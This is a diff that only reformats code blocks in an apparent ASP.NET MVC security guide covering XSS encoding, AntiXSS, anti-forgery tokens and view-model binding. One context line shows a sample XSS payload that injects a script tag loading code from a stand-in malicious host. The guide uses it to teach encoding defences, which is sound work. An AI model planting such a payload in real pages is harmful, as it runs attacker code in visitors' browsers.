@@ -388,11 +388,9 @@ If the user is evil, she could change this name to:
 ```"></a><script src="http://srizbitrojan.evil.example.com"></script> <a href="```
 and then pass that link on to unsuspecting users. You can avoid this by using encoding with Url.
 Encode or Html.AttributeEncode:
-```<a href="<%=Url.Action("index","home",new
-{name=Html.AttributeEncode(ViewData["name"])})%>">Click here</a>```
+```<a href="<%=Url.Action("index","home",new {name=Html.AttributeEncode(ViewData["name"])})%>">Click here</a>```
 or:
-```<a href="<%=Url.Encode(Url.Action("index","home",
-new {name=ViewData["name"]}))%>">Click here</a>```
+```<a href="<%=Url.Encode(Url.Action("index","home", new {name=ViewData["name"]}))%>">Click here</a>```
 Bottom line: Never, ever trust any data that your user can somehow touch or use. This includes
 any form values, URLs, cookies, or personal information received from third-party sources such
 as OpenID. Remember that the databases or services your site accesses can be compromised, too.
@@ -420,9 +418,11 @@ whereas ASP.NET encoding is primarily focused on preventing display problems due
 
 > To use the AntiXSS library, you’ll just need to make a one-line addition to the
 httpRuntime section of your web.config:
-```<httpRuntime ...
+```
+<httpRuntime ...
 encoderType="System.Web.Security.AntiXss.AntiXssEncoder,System.Web,
-Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />```
+Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+```
 > With that in place, any time you call Html.Encode or use an <%:%> HTML Encoding Code Block,
 the AntiXSS library encodes the text, which takes care of both HTML and JavaScript encoding.
 The portions of the AntiXSS library included in .NET 4.5 are
@@ -457,10 +457,12 @@ ASP.NET MVC includes a nice way of preventing CSRF attacks, and it works on the 
 verifying that the user who submitted the data to your site did so willingly. The simplest way to do
 this is to embed a hidden input into each form request that contains a unique value. You can do this
 with the HTML Helpers by including this in every form:
-```<form action="/account/register" method="post">
+```
+<form action="/account/register" method="post">
 @Html.AntiForgeryToken()
 …
-</form>```
+</form>
+```
 Html.AntiForgeryToken outputs an encrypted value as a hidden input:
 ```<input type="hidden" value="012837udny31w90hjhf7u">```
 This value matches another value that is stored as a session cookie in the user’s browser. When the
@@ -593,7 +595,7 @@ public string Name { get; set; }
 public string Comment { get; set; }
 }
 ```
-> The benefi t of binding to view models instead of data models is that it’s a lot more foolproof. Rather
+> The benefit of binding to view models instead of data models is that it’s a lot more foolproof. Rather
 than having to remember to include whitelist or blacklists (and keep them up to date), the view
 model approach is a generally safe design—the only way something can get bound is if you include it
 in your view model.
